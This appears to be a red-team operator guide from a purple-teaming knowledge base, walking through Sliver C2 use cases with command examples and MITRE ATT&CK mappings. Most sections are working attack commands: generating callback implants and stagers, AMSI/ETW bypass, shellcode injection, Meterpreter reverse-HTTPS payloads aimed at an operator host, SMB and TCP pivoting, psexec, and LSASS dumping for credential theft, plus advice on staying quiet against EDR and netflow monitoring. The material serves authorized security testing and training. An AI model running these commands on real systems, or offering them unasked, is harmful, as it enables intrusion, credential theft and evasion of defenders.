# Sliver — Hands-On Use Cases

All commands verified against `master`-branch source in [BishopFox/sliver](https://github.com/BishopFox/sliver) (`v1.7.x` command tree). Session-level commands (pivots, execution, filesystem, etc.) are run from within an active `sliver (IMPLANT_NAME) >` prompt; server-console-level commands (`generate`, listener jobs, `armory`, `operator`) are run from the top-level `sliver >` prompt.

## Contents
- [Standing Up a Multiplayer Server](#standing-up-a-multiplayer-server)
- [mTLS Listener and Baseline Session Implant](#mtls-listener-and-baseline-session-implant)
- [Generating a Beacon for a Long, Low-Noise Engagement](#generating-a-beacon-for-a-long-low-noise-engagement)
- [HTTP(S) Listener for Egress-Friendly C2](#https-listener-for-egress-friendly-c2)
- [DNS Listener for Restrictive Egress Environments](#dns-listener-for-restrictive-egress-environments)
- [Staged Payload Delivery](#staged-payload-delivery)
- [Catching a Callback and Triaging Session vs. Beacon](#catching-a-callback-and-triaging-session-vs-beacon)
- [Executing .NET Tooling In-Memory with execute-assembly](#executing-net-tooling-in-memory-with-execute-assembly)
- [Sideloading an Unmanaged DLL](#sideloading-an-unmanaged-dll)
- [Migrating to a Longer-Lived Process](#migrating-to-a-longer-lived-process)
- [Executing Raw Shellcode](#executing-raw-shellcode)
- [Pivoting Through a Compromised Host via SMB Named-Pipe C2](#pivoting-through-a-compromised-host-via-smb-named-pipe-c2)
- [Pivoting via Raw TCP](#pivoting-via-raw-tcp)
- [Installing and Running a Third-Party Tool via the Armory](#installing-and-running-a-third-party-tool-via-the-armory)
- [Remote Service Execution with psexec](#remote-service-execution-with-psexec)
- [Bridging into Metasploit Tradecraft](#bridging-into-metasploit-tradecraft)
- [SOCKS5 Proxying and Port Forwarding](#socks5-proxying-and-port-forwarding)
- [Dumping LSASS for Offline Credential Extraction](#dumping-lsass-for-offline-credential-extraction)

---

## Standing Up a Multiplayer Server

**MITRE ATT&CK:** [T1219](https://attack.mitre.org/techniques/T1219/) (Remote Access Software) — infrastructure setup, not itself an ATT&CK-tagged technique against a target

```bash
# On the server host
sliver-server

# Generate a distributable operator config (mTLS client cert bundle)
sliver-server operator --name teammate1 --lhost 203.0.113.10 --lport 31337 \
  --permissions all --save /tmp/teammate1.cfg
```

`operator` (verified against `server/cli/operator.go`) requires `--name`, `--lhost`, and `--permissions`; `--lport` defaults to the daemon's configured multiplayer port if running in daemon mode. The generated `.cfg` bundles an mTLS client certificate signed by the server's own CA — hand it to a second operator running `sliver-client import /tmp/teammate1.cfg` to join the same server, same session/beacon state, cryptographically distinct from every other operator.

## mTLS Listener and Baseline Session Implant

**MITRE ATT&CK:** [T1071](https://attack.mitre.org/techniques/T1071/) (Application Layer Protocol) · [T1573.001](https://attack.mitre.org/techniques/T1573/001/) (Symmetric Cryptography) · [T1573.002](https://attack.mitre.org/techniques/T1573/002/) (Asymmetric Cryptography)

```
sliver > mtls -L 0.0.0.0 -l 8888
[*] Starting mTLS listener ...

sliver > generate --mtls 203.0.113.10:8888 --os windows --arch amd64 --save /tmp/
[*] Generating new windows/amd64 implant binary
[*] Sliver implant saved to: /tmp/SNOWY_TIGER.exe
```

This is the baseline case every other scenario below varies from. `mtls` (default port 8888) starts the listener job; `generate` with no `beacon` subcommand produces a persistent, interactive **session** implant. No transport flag other than `--mtls` is required — `--os`/`--arch` default to `windows`/`amd64` if omitted.

## Generating a Beacon for a Long, Low-Noise Engagement

**MITRE ATT&CK:** T1071.001 (Web Protocols, if paired with HTTP transport) · [T1029](https://attack.mitre.org/techniques/T1029/) (Scheduled Transfer, conceptually — the check-in interval)

```
sliver > generate beacon --mtls 203.0.113.10:8888 --os windows --arch amd64 \
  --seconds 300 --jitter 120 --save /tmp/
```

`generate beacon` (distinct subcommand from plain `generate`) produces an asynchronous implant: it connects, pulls any queued tasks, executes, uploads results, then disconnects until the next interval. `--seconds 300 --jitter 120` means a base check-in every 5 minutes with up to 2 minutes of randomized additional delay — a deliberately loose cadence appropriate for a multi-week engagement where a live, continuously-connected session would stand out far more in netflow analysis. Beacons are the framework's more OPSEC-conscious default; tighten the interval only when interactivity is worth the added footprint.

## HTTP(S) Listener for Egress-Friendly C2

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Web Protocols)

```
sliver > https -L 0.0.0.0 -l 443 --lets-encrypt -d c2.example.com
[*] Starting HTTPS listener ...

sliver > generate beacon --http https://c2.example.com --os windows --arch amd64 \
  --c2profile my-profile --save /tmp/
```

`https` with `--lets-encrypt` auto-provisions a real certificate (requires the listener host to be internet-reachable on 443 for ACME HTTP-01 validation) so the C2 channel presents as ordinary HTTPS traffic to a plausible-looking domain rather than a self-signed cert. `--c2profile` selects a configured HTTP C2 profile controlling URL-path/header shaping so requests don't share an obviously static pattern across implants. Use `http`/`--http` (no TLS) only where HTTPS interception/inspection is the specific concern being tested — it trades transport confidentiality for that scenario.

## DNS Listener for Restrictive Egress Environments

**MITRE ATT&CK:** [T1071.004](https://attack.mitre.org/techniques/T1071/004/) (DNS)

```
sliver > dns -d c2dns.example.com -L 0.0.0.0 -l 53
[*] Starting DNS listener ...

sliver > generate beacon --dns c2dns.example.com --os windows --arch amd64 \
  --seconds 600 --jitter 300 --save /tmp/
```

DNS C2 depends on the operator controlling `c2dns.example.com` and having delegated it (`NS` record) to the listener host — without that delegation, DNS resolution for the implant's queries never reaches the Sliver server. This is the fallback transport for environments with tightly filtered HTTP(S)/direct-TCP egress but permissive internal DNS resolution (very common in segmented enterprise networks where DNS is allowed to an internal resolver that ultimately recurses out). `--no-canaries` on the listener disables Sliver's own DNS-canary-domain monitoring if it would collide with the assessment's actual domain use — leave it enabled by default, since canaries are themselves a useful operator-side detection-of-detection signal (see `03 - Source Evidence.md`).

## Staged Payload Delivery

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```
sliver > new-profile --name win-shellcode --mtls 203.0.113.10:8888 --skip-symbols --format shellcode
[*] Saved new profile win-shellcode

sliver > stage-listener --url tcp://203.0.113.10:1234 --profile win-shellcode
[*] Job N (tcp) started

sliver > generate stager --lhost 203.0.113.10 --lport 1234 --save /tmp/
[*] Sliver stager saved to: /tmp/STAGER_NAME
```

For size-constrained delivery contexts (a macro, a small dropper), a stager is a minimal stub that connects to the `stage-listener` job and pulls the full implant into memory at runtime rather than shipping the entire implant up front. `stage-listener` only accepts `tcp://` or `http://` URL schemes. `generate stager` defaults to TCP staging; pass `--protocol http` for an HTTP-based stage pull instead.

## Catching a Callback and Triaging Session vs. Beacon

**MITRE ATT&CK:** T1071 (Application Layer Protocol) — the resulting connection itself

```
sliver > sessions
 ID  Name          Transport  Remote Address       Hostname   Username         OS               Last Check-in
 ==  ====          =========  ==============       ========   ========         ==               =============
 3   SNOWY_TIGER   mtls       10.10.10.20:51422     WKSTN01    CORP\jsmith      windows/amd64    <just now>

sliver > beacons
 ID  Name          Transport  Interval   Last Check-in   Next Check-in
 ==  ====          =========  ========   =============   =============
 1   RUSTY_ANVIL   https      5m0s±2m0s  2m ago           ~3m

sliver > use SNOWY_TIGER
sliver (SNOWY_TIGER) > info
```

`sessions` lists live interactive implants; `beacons` lists async ones with their configured interval/jitter and check-in timing. `use <name>` (or `use <ID>`) drops into that implant's context for follow-on commands. For a beacon, any command issued is **queued**, not executed immediately — `beacons watch` or re-running `beacons` after the next check-in shows task completion.

## Executing .NET Tooling In-Memory with execute-assembly

**MITRE ATT&CK:** [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection) · [T1620](https://attack.mitre.org/techniques/T1620/) (Reflective Code Loading) · [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution, if the hosting process is a signed OS binary)

```
sliver (SNOWY_TIGER) > execute-assembly /tools/Seatbelt.exe -group=system

sliver (SNOWY_TIGER) > execute-assembly --in-process --amsi-bypass --etw-bypass /tools/Rubeus.exe kerberoast
```

Default behavior spawns a **sandboxed child process** (`--process`, default `notepad.exe`) to host the assembly, keeping it out of the implant's own memory space. `--in-process` runs it inside the implant itself instead — faster and avoids a second process appearing in the process tree, but only `--in-process` unlocks `--amsi-bypass`/`--etw-bypass`, since those patches target the calling process's own AMSI/ETW providers. `--class`/`--method` are required only for a .NET **DLL** target (a bare EXE's `Main` is located automatically).

## Sideloading an Unmanaged DLL

**MITRE ATT&CK:** T1055 (Process Injection) · [T1129](https://attack.mitre.org/techniques/T1129/) (Shared Modules)

```
sliver (SNOWY_TIGER) > sideload -e VoidFunc -p C:\Windows\System32\notepad.exe /tools/payload.dll
```

`sideload` is the unmanaged-code equivalent of `execute-assembly` — loads and executes a DLL/`.so`/`.dylib` in a hosting process (default `notepad.exe`) rather than requiring a .NET assembly. `-e, --entry-point` names the export to call; `-k, --keep-alive` leaves the host process running after execution completes rather than tearing it down.

## Migrating to a Longer-Lived Process

**MITRE ATT&CK:** [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection) — the sub-technique most consistent with a full implant relocation

```
sliver (SNOWY_TIGER) > ps
sliver (SNOWY_TIGER) > migrate --pid 4212
```

`migrate` moves the implant's running context into another process by `--pid` or `--process-name`, typically used to move off a short-lived initial-access process (an Office app, a script host) and into a stable, long-running one before the original process is closed or crashes. An optional `--shellcode-encoder` applies encoding to the migration shellcode itself.

## Executing Raw Shellcode

**MITRE ATT&CK:** [T1055.001](https://attack.mitre.org/techniques/T1055/001/) (Dynamic-link Library Injection, if `--pid` targets another process) · T1027 (Obfuscated Files or Information, with `--shikata-ga-nai`)

```
sliver (SNOWY_TIGER) > execute-shellcode --pid 0 /tools/payload.bin

sliver (SNOWY_TIGER) > execute-shellcode --shikata-ga-nai --architecture amd64 --iterations 3 /tools/payload.bin
```

`--pid 0` (the default) runs shellcode in the implant's own process; a nonzero `--pid` injects into another running process. `--shikata-ga-nai` applies Sliver's own polymorphic encoder pass before execution — the same encoding algorithm `msfvenom` uses, ported natively rather than shelled out to Metasploit. `--rwx-pages` forces RWX memory permissions instead of the tool's default write-then-protect pattern, trading a stronger EDR signal for broader compatibility with picky shellcode.

## Pivoting Through a Compromised Host via SMB Named-Pipe C2

**MITRE ATT&CK:** [T1090.001](https://attack.mitre.org/techniques/T1090/001/) (Internal Proxy) · [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (SMB/Windows Admin Shares, for the underlying transport)

```
sliver (SNOWY_TIGER) > pivots named-pipe --name corpupdate
[*] Listening on \\.\pipe\corpupdate

sliver > generate --named-pipe WKSTN01/.pipe/corpupdate --skip-symbols --save /tmp/
```

Verified against the current `pivots` cobra subcommand tree (`client/command/pivots/commands.go`) — this supersedes the older flat `named-pipe` command documented in pre-2022 tutorials. `pivots named-pipe --name <name>` on an already-established implant (`SNOWY_TIGER`, on host `WKSTN01`) starts a named-pipe listener; a second implant generated with `--named-pipe HOSTNAME//./pipe/NAME` connects **through** the first implant rather than dialing the Sliver server directly — meaning the pivoted host needs **no direct egress at all**, only SMB/IPC reachability to the pivot host. This is the standard move for reaching a segmented subnet from one foothold.

## Pivoting via Raw TCP

**MITRE ATT&CK:** T1090.001 (Internal Proxy)

```
sliver (SNOWY_TIGER) > pivots tcp -b 172.16.241.1 -l 8000
[*] Listening on tcp://172.16.241.1:8000

sliver > generate --tcp-pivot 172.16.241.1:8000 --skip-symbols --save /tmp/
```

Same peer-to-peer pivot concept as named-pipe, over raw TCP (default port 9898 if `-l` omitted) instead of SMB — the option to use where the target segment doesn't support/allow SMB, or where the pivoted host is non-Windows (named-pipe pivoting is Windows-only; TCP pivoting is cross-platform).

## Installing and Running a Third-Party Tool via the Armory

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer, for the operator-side download) — the installed tool's own techniques apply once run

```
sliver > armory search rubeus
sliver > armory install Rubeus
[*] Adding rubeus command: Rubeus is a C# tool set for raw Kerberos interaction and abuses.

sliver (SNOWY_TIGER) > rubeus kerberoast
```

`armory install <name>` (default index `sliver.re`, `-a` to target a different configured armory) downloads a community-published alias/extension package and registers it as a native console command — no manual DLL/assembly staging or `execute-assembly` invocation needed for tools distributed this way. `armory update` refreshes all installed packages. This is how the GhostPack suite (Rubeus, Seatbelt, SharpWMI, SafetyKatz, etc.) is normally brought into a Sliver engagement — see `Purple Teaming/GhostPack/` for the underlying tools' own mechanics.

## Remote Service Execution with psexec

**MITRE ATT&CK:** [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (Service Execution) · [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (SMB/Windows Admin Shares)

```
sliver (SNOWY_TIGER) > psexec --service-name UpdaterSvc --service-description "Update Service" \
  --binpath 'C:\Windows\Temp' TARGET-HOST
```

Sliver's own PsExec-style module — generates a fresh Sliver service binary (or uses `--custom-exe` to push an arbitrary executable instead) and registers it as a Windows service on the named target, using the operator's current authenticated context. Distinct from both Impacket's `psexec.py` (see `Purple Teaming/Impacket/psexec/`) and Sysinternals PsExec — same underlying SCM/service-creation mechanism, different implementation and payload.

## Bridging into Metasploit Tradecraft

**MITRE ATT&CK:** T1055 (Process Injection, for `msf-inject`) · T1071 (Application Layer Protocol, for the resulting MSF callback)

```
sliver (SNOWY_TIGER) > msf --payload meterpreter_reverse_https --lhost 203.0.113.10 --lport 4444

sliver (SNOWY_TIGER) > msf-inject --pid 4212 --payload meterpreter_reverse_https --lhost 203.0.113.10 --lport 4444
```

`msf` executes a Metasploit payload directly in the implant's own process; `msf-inject` injects it into a different target PID. Both default to `meterpreter_reverse_https` and accept an MSF `--encoder`/`--iterations` pair — useful for handing off to Metasploit's much larger post-exploitation module library (see `Purple Teaming/Metasploit/`) without needing a separate initial-access chain.

## SOCKS5 Proxying and Port Forwarding

**MITRE ATT&CK:** T1090.001 (Internal Proxy) · [T1572](https://attack.mitre.org/techniques/T1572/) (Protocol Tunneling)

```
sliver (SNOWY_TIGER) > socks5 start
[*] Started SOCKS5 listener

sliver (SNOWY_TIGER) > portfwd add --remote 10.10.10.20:3389 --bind 127.0.0.1:13389
```

`socks5 start` turns the implant into a SOCKS5 proxy endpoint, letting the operator route arbitrary local tooling (browsers, `proxychains`-wrapped scanners, RDP clients) through the compromised host without executing each action as a discrete Sliver command. `portfwd add` sets up a direct point-to-point forward instead, useful for a single well-known service (e.g. RDP) rather than general-purpose proxying. Both avoid needing a purpose-built command for every follow-on tool.

## Dumping LSASS for Offline Credential Extraction

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (LSASS Memory)

```
sliver (SNOWY_TIGER) > procdump -n lsass.exe --save /tmp/lsass.dmp
```

Sliver's built-in `procdump` command (verified against `client/command/processes/commands.go`) — dumps process memory by `-p, --pid` or `-n, --name`. Against `lsass.exe` this is a direct path to offline parsing with Mimikatz (`sekurlsa::minidump`, see `Purple Teaming/Mimikatz/sekurlsa (Credential Dumping)/`) or Pypykatz rather than running a credential-dumping tool directly in the implant's own process. `-X, --loot` saves the dump into Sliver's own loot store instead of (or alongside) a local file. Prefer this over `execute-assembly`-ing a Mimikatz build where minimizing time-in-target-process-memory is a priority — the dump itself can be exfiltrated and parsed entirely offline.